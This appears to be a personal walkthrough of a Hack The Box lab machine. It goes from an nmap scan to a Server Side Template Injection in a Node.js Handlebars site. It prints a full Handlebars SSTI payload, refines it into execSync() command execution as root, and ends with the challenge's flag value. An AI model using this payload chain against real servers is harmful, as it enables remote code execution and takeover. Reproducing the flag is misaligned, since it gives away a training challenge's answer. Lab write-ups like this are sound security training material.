We start by a scan: nmap -sC -sV -v (target ip)

-v: To increase the verbosity level (more details)

We see that two ports are open port 22 which is an SSH, and port 80 which is running an HTTP Node.js server and
making use of the Express framework.

Upon visiting port 80, we are presented with a webpage that is currently under construction and the option
to subscribe to updates about the page using an email address. An email subscription in web pages is
usually an option that allows web visitors to receive updates via email, regarding the status of the website or
the company or individual that owns it.
Let's provide a test email to verify we have a working application. When given an application to test, use it as
if you are using it intendedly. Sometimes, developers put in poor code as a quick solution, leading to
vulnerabilities. Let's input the email pwninx@hackthebox.eu and click submit.

The email that we have provided is being showed back to us in the website.

Using Wappalyzer, we can see that this website uses node.js and express

With this information in mind we can start identifying potential exploitation paths. Various attempts at
verifying an XSS vulnerability with default payloads, such as <script>alert(1)</script> , have been
unsuccessful. For this reason we must look for a different vulnerability.
Node.js and Python web backend servers often make use of a software called "Template Engines"

What is a Template Engine?
Template Engines are used to display dynamically generated content on a web page. They replace the
variables inside a template file with actual values and display these values to the client (i.e. a user opening a
page through their browser).
For instance, if a developer needs to create a user profile page, which will contain Usernames, Emails,
Birthdays and various other content, that is very hard if not impossible to achieve for multiple different
users with a static HTML page. The template engine would be used here, along a static "template" that
contains the basic structure of the profile page, which would then manually fill in the user information and
display it to the user.
Template Engines, like all software, are prone to vulnerabilities. The vulnerability that we will be focusing on
today is called Server Side Template Injection (SSTI).

What is an SSTI?
Server-side template injection is a vulnerability where the attacker injects malicious input into a template in order
to execute commands on the server.
To put it plainly an SSTI is an exploitation technique where the attacker injects native (to the Template
Engine) code into a web page. The code is then run via the Template Engine and the attacker gains code
execution on the affected server.
This attack is very common on Node.js websites and there is a good possibility that a Template Engine is
being used to reflect the email that the user inputs in the contact field.

We need to identify what template engine we are dealing with so we can explit it.

Luckily, the Hacktricks article provides us with examples to try and to exploit with:

{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}

The first exploit works and we get an error page. This happened because the template engine dealt with this input as valid code to execute.

This means that the payload was indeed detected as valid by the template engine, however the code had
some error and was unable to be executed. An error is not always a bad thing. On the contrary for a
Penetration Tester, it can provide valuable information. In this case we can see that the server is running
from the /root/Backend directory and also that the Handlebars Template Engine is being used.

//////////////////////////////////////////////
//////////////////////////////////////////////
//////////////////////////////////////////////

Using Burpsuite:

Watch this Youtube video to understand how to use foxyproxy and Burbsuite : https://www.youtube.com/watch?v=Vw4-nP5oXGU&ab_channel=AbrictoSecurity

After setting up foxyproxy and burbsuit, we reload the website page and we submit the exploit code again. Now we open burbsuit to see that we get an output in the proxy tab.

We send the Post request that we got in Burbsuit to the repeater.

We also neet to grab this payload section that is responsoble for exploiting the handlebar engine template from HackTricks:
{{#with "s" as |string|}}
 {{#with "e"}}
 {{#with split as |conslist|}}
 {{this.pop}}
 {{this.push (lookup string.sub "constructor")}}
 {{this.pop}}
 {{#with string.split as |codelist|}}
 {{this.pop}}
 {{this.push "return require('child_process').exec('whoami');"}}
 {{this.pop}}
 {{#each conslist}}
 {{#with (string.sub.apply 0 codelist)}}
 {{this}}
 {{/with}}
 {{/each}}
 {{/with}}
 {{/with}}
 {{/with}}
{{/with}}


We put all of this to the encoder tab and we choose to encode it as URL. We get a very long output.

We copy this output and we go back to the repeater. We paste this output into the email.
Note, we dont replace the & symbol, we need to leave it alone.

We click send. We are faced with another error says ReferenceError: require is not defined.
This means require is not a global object, so we cant use it.

Instead, we change the line {{this.push "return require('child_process').exec('whoami');"}} to be {{this.push "return process"}}, because process is a global object.

We decode the whole payload again as URL using decoder.

We send the decoded payload back to the repeater. We press send.

We did not get an error message this time.

We change that line again to {{this.push "return process.mainModule"}} Which is another way to get require.main.

We send with the new URL.

We change the line one more time to {{this.push "return process.mainModule.require('child_process')"}}

We change the line again to :{{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}

In the responce section in the repeater, and after we send Post request with the new URL, we see at the bottom of it that we have root written.


Instead of doing whoami, we can do : ls /root

This will show us a list of the files in the root directory in ther Response section.

We see the flag.txt file listed.

We now know that we can use Linux commands to interact with the website, now what we can do is : cat root/flag.txt

flag: 6b258d726d287462d60c103d0142a81c

//END




